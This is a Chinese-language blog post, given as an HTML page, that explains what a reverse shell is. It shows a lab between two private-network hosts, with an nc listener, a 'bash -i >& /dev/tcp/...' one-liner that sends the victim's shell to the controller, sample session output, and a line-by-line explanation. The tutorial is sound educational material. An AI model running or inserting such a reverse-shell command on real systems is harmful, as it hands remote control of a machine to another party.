@@ -1,0 +1,193 @@
+<!doctype html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>反弹SHELL介绍及原理-大江小浪</title>
+    <meta name="baidu-site-verification" content="y4EEfl1oRM" />
+    <meta name="keywords" content="反弹shell, reverse shell, 反弹shell原理">
+    <meta name="description" content="如果我们需要到服务器上执行 Shell 命令，但是因为防火墙等原因，无法由客户端主动发起连接的情况，就可以使用反弹 Shell 来满足登陆和操作的需求。">
+    <link href="/bootstrap-5.1.3-dist/css/bootstrap.min.css" rel="stylesheet">    
+    <link rel="stylesheet" href="/css/main.css" />
+    
+    <script>
+    //百度统计代码
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?768e225ca43b028a6d15124a73b5c8d2";
+      var s = document.getElementsByTagName("script")[0]; 
+      s.parentNode.insertBefore(hm, s);
+    })();
+</script>    
+    <meta name="msvalidate.01" content="D8350FC7417B692DE23E5326C13202D3" />
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body class="wave">
+    <nav class="navbar blog-header navbar-expand-lg ">
+        <div class="container-fluid">
+            <a class="navbar-brand" href="/">大江小浪</a>
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="菜单">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarNav">
+                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
+                
+                    <li class="nav-item">
+                        <a class="nav-link" href="/">首页</a>
+                    </li>
+                
+                    <li class="nav-item">
+                        <a class="nav-link" href="/links/">链接</a>
+                    </li>
+                
+                    <li class="nav-item">
+                        <a class="nav-link" href="/about/">关于</a>
+                    </li>
+                
+                </ul>
+            </div>
+        </div>
+    </nav>
+    <div class="container blog-content">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-9 col-xl-9 col-xxl-9">
+                <div class="blog-post-detail">
+    <div class="blog-post-title">
+      <h1>反弹SHELL介绍及原理</h1>
+    </div>
+    <div class="blog-post-meta">
+        
+        <span class="post-time">更新于：2026-03-31 10:54:02</span>
+        
+        <span class="post-time">发布于：2021-01-27 23:26:09</span>
+    </div>
+    <div class="blog-post-content">
+      <div class="blog-post-ad">
+        <!-- <h3>为感谢各位朋友对本站的关注，在2021年元旦即将到来之际为大家提供一张「腾讯视频VIP兑换卡」，扫描下方的小程序二维码即可参与活动，活动中奖者将获得一张「腾讯视频VIP兑换卡」，感谢大家对小站的支持，祝大家好运并提前祝大家新年快乐！</h3> -->
+        <!-- <div>
+          <a href="https://cloud.tencent.com/developer/grocery-stall3?invitedUid=2725480" target="_parent"><img src="/image/ad_image.png" alt="扫码参与活动，攒云+值，得云+社区定制礼盒"></a>
+        </div> -->
+      </div>
+      <p>如果我们需要到服务器上执行 Shell 命令，但是因为防火墙等原因，无法由客户端主动发起连接的情况，就可以使用反弹 Shell 来满足登陆和操作的需求。</p>
+<h2 id="什么是反弹Shell"><a href="#什么是反弹Shell" class="headerlink" title="什么是反弹Shell"></a>什么是反弹Shell</h2><p>正常情况下，我们登陆服务器获取 Shell 会话是下面的步骤，用户在终端软件（Terminal）中输入 <code>ssh root@ip</code> 登陆目标机器，登陆成功后即可以开始Shell操作。</p>
+<img src="/2021/01/27/20210129-reverse-shell/image-20210128083442895.png" class="" title="image-20210128083442895">
+
+<p>反弹Shell（Reverse Shell），顾名思义是指与正常的 sshd 服务相反，由控制端监听，被控制端发起请求到监听端口，并将其命令行的输入输出转到控制端。</p>
+<img src="/2021/01/27/20210129-reverse-shell/image-20210129080743429.png" class="" title="image-20210129080743429">
+
+
+
+<h2 id="实战介绍"><a href="#实战介绍" class="headerlink" title="实战介绍"></a>实战介绍</h2><p>准备两台网络连通的服务器：</p>
+<ul>
+<li>控制端：172.16.51.130</li>
+<li>被控端：172.16.51.128</li>
+</ul>
+<p>控制端监听一个端口</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ nc -lvp 8888</span><br><span class="line">listening on [any] 8888 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>被控端生成一个反弹 Shell</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ bash -i &gt;&amp; /dev/tcp/172.16.51.130/8888 0&gt;&amp;1 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>这时注意观察控制端，会出现被控端的 shell 提示符</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">172.16.51.128: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [172.16.51.130] from (UNKNOWN) [172.16.51.128] 47584</span><br><span class="line">tiago@lampiao:~$ whoami</span><br><span class="line">whoami</span><br><span class="line">tiago</span><br><span class="line">tiago@lampiao:~$ hostname</span><br><span class="line">hostname</span><br><span class="line">lampiao</span><br><span class="line">tiago@lampiao:~$ ip addr</span><br><span class="line">ip addr</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000</span><br><span class="line">    link/ether 00:0c:29:cc:9b:c6 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.16.51.128/24 brd 172.16.51.255 scope global eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::20c:29ff:fecc:9bc6/64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure>
+
+<p>在提示符下输入命令，可以看到确实是在被管机上执行的命令及返回的结果，就像我们登陆到了被管机一样。</p>
+<p>具体解释如下：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nc -lvp 8888</span><br></pre></td></tr></table></figure>
+
+<p>使用 nc 命令在控制端监听端口，<code>-l</code> 表示监听 <code>-p</code> 表示端口。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ bash -i &gt;&amp; /dev/tcp/172.16.51.130/8888 0&gt;&amp;1 2&gt;&amp;1</span><br><span class="line"><span class="comment"># bash -i 表示进入一个交互式的Shell环境</span></span><br><span class="line"><span class="comment"># &gt;&amp; 表示将交互式Shell发送给后续的文件，并且将&amp;联合符号后面的内容也发送到重定向</span></span><br><span class="line"><span class="comment"># /dev/tcp/172.16.51.130/8888 实际是 `bash` 实现的用来实现网络请求的一个接口。打开这个文件就相当于发出了一个socket调用并建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。</span></span><br><span class="line"><span class="comment"># 0&gt;&amp;1 表示将标准的输入与标准输出相结合，都发给重定向文件</span></span><br><span class="line"><span class="comment"># 2&gt;&amp;1 表示将标准输出和标准错误输出都发送到socket文件中，即我们能够在控制端看到命令的返回，在被控端看不到相关信息。</span></span><br></pre></td></tr></table></figure>
+
+<p>上面的命令联合起来意思就是，我们在被管机上产生了一个 bash 环境，将它发送给了远程的控制主机，同时将被管机的标准输入、标准输出、标准错误输出都发送给了控制主机，这样实现了获取被管主机 shell 执行环境的目的。</p>
+<p>本文介绍的是最简单的一种反弹shell实现方式，反弹shell还有很多种的实现方式，实现的思路应该都差不多，等稍后整理出来与大家分享。 </p>
+<p>在 macOS 中，可以通过以下命令启动监听</p>
+<blockquote>
+<p>nc -l 8889 -v</p>
+</blockquote>
+
+      <div class="blog-post-footer">
+        <p><img src="/image/qrcode.jpg" alt=""></p>
+        <p><b>用心体验、认真记录</b>，欢迎关注<a href="https://www.edulinks.cn">大江小浪</a>的技术人生！</p>
+      </div>
+    </div>
+    
+    <div class="blog-post-nav row">
+      
+        <div class="nav-link col-md-6">
+          <a href="/2021/01/29/20210131-gordon-moore/" id="article-nav-newer" class="article-nav-link-wrap">
+            &lt;&lt; 戈登·摩尔
+          </a>  
+        </div>
+      
+      
+        <div class="nav-link col-md-6">
+          <a href="/2021/01/26/20210126-nmap-notes/" id="article-nav-older" class="article-nav-link-wrap">
+            NMAP学习笔记 &gt;&gt;
+          </a>
+        </div>
+      
+    </div>
+        
+  </div>
+  
+            </div>
+            <div class="blog-side col-xs-12 col-sm-12 col-md-12 col-lg-3 col-xl-3 col-xxl-3">
+                <div class="blog-profile">
+                    <div class="blog-author">
+
+    <div class="author-img">
+        <a href="#"><img src="/image/qrcode.jpg" alt=""></a>
+    </div>
+
+    <div class="author-desc">
+        <h1>cocowool</h1>
+        <p>A FULL STACK DREAMER!</p>
+    </div>
+</div>
+                </div>
+                <div class="blog-google-ads">
+                    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+     <!-- EDULINKS-Right -->
+     <ins class="adsbygoogle"
+          style="display:block"
+          data-ad-client="ca-pub-2449691085720111"
+          data-ad-slot="7013232113"
+          data-ad-format="auto"
+          data-full-width-responsive="true"></ins>
+     <script>
+
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>                </div>
+            </div>
+        </div>
+    </div>
+    <div class="container-fluid blog-footer">
+        <div class="container">
+            <div class="row blog-friend-link">
+                <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12 col-xl-12 col-xxl-12">
+                    <h3>友情链接</h3>
+                </div>
+                
+                
+                <div class="col-xs-12 col-sm-12 col-md-6 col-lg-3 col-xl-3 col-xxl-3">
+                    <a target="_blank" href="http://www.edulinks.cn">大江小浪</a>
+                </div>
+                
+                <div class="col-xs-12 col-sm-12 col-md-6 col-lg-3 col-xl-3 col-xxl-3">
+                    <a target="_blank" href="http://www.popsite.cn">Popsite</a>
+                </div>
+                
+            </div>
+            <div class="row">
+                <div class="blog-copyright">
+                    <p>&copy; 2020 - 2025 All rights reserved. 大江小浪  - <a href="https://beian.miit.gov.cn/" target="_blank">京ICP备15058613-2号</a>   - <a href="http://www.beian.gov.cn/portal/index.do" target="_blank">京公安网备案11010802035682号</a></p>
+                </div>    
+            </div>
+        </div>
+    </div>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta1/dist/js/bootstrap.bundle.min.js" integrity="sha384-ygbV9kiqUc6oa4msXn9868pTtWMgiQaeYH7/t7LECLbyPA2x65Kgf80OJFdroafW" crossorigin="anonymous"></script>
+    
+<script src="/scripts/main.js"></script>
+
+</body>
+</html>
